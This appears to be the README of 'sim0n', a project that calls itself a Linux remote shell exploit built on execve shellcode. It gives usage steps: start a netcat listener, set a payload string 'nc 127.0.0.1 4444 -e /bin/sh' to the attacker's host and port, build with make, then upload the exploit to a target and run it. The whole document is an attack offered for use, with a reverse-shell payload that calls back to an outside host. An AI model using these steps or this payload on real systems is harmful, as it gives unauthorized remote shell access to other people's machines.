# sim0n

*Buffer overflow, AAAAAAAAA, Segmentation fault*

Sim0n is a Linux remote shell exploit that exploits memory vulnerabilities via shell code generated with execve system call.

## Usage

**1** Start the listener on your computer

```shell
nc -lvp 4444
```

**2.** Modify this string of payload change it to your host and port

```nasm
cmd: db         "nc 127.0.0.1 4444 -e /bin/sh"
```

**3.** Run `make all`

**4.** Upload `exploit` file to target and execute
